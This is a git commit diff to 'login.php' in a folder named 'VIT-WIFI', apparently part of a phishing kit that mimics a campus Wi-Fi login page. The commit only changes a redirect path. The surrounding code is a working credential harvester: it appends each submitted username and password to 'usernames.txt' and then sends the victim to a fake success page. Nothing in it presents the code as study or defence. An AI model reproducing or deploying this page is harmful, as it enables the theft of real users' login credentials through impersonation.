0df2c67cbb48aca3391d3769af25c56a46d47fc3
Mohammed Aneez <128913614+AneezHussain@users.noreply.github.com>
2025-04-15 13:31:42 +0530

    Update login.php

--- .sites/VIT-WIFI/login.php
+++ .sites/VIT-WIFI/login.php
@@ -1,5 +1,5 @@
 <?php
 file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
-header('Location: successful_login.html');
+header('Location: ./successful_login.html');
 exit();
 ?>
